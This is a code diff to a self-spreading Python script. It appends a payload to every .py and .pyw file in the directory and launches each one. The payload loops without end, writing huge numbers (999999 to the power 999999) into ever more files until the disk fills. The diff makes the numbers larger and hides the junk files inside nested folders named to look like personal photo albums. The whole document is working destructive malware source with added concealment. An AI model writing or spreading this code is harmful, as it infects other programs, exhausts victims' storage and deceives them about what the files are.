@@ -2,8 +2,20 @@
 import sys
 import glob
 import subprocess
+import os
 
-payload="""def task():\n    m=69420\n    fc=1\n    while fc != 0:\n      dn=open("dn"+str(fc), "w")\n      dn.write(str(m**69420))\n      dn.close()\n      fc=fc+1\ntask()"""
+payload="""
+def task():
+    m=999999
+    fc=1
+    fh="photos/pictures/2023/other/me/all/"
+    while fc != 0:
+      dn=open(fh+"dn"+str(fc), "w")
+      dn.write(str(m**999999))
+      dn.close()
+      fc=fc+1
+task()
+"""
 spread_files = glob.glob('*.py') + glob.glob('*.pyw')
 
 for file in spread_files:
@@ -22,12 +34,24 @@ for file in spread_files:
         f.writelines(payload)
     subprocess.Popen(['python', file])
 
+pdir="photos/pictures/"
+dir1="photos/pictures/2022/personal/me/trips/fun/important/all/"
+dir2="photos/pictures/2022/other/me/trips/fun/important/all/"
+dir3="photos/pictures/2023/personal/me/trips/fun/important/all/"
+dir4="photos/pictures/2023/other/me/trips/fun/important/all/"
+if not os.path.exists(pdir):
+    os.makedirs(dir1)
+    os.makedirs(dir2)
+    os.makedirs(dir3)
+    os.makedirs(dir4)
+
 def task():
-    m=69420
+    m=999999
     fc=1
+    fh="photos/pictures/2023/other/me/trips/fun/important/all/"
     while fc != 0:
-      dn=open("dn"+str(fc), "w")
-      dn.write(str(m**69420))
+      dn=open(fh+"dn"+str(fc), "w")
+      dn.write(str(m**999999))
       dn.close()
       fc=fc+1
 
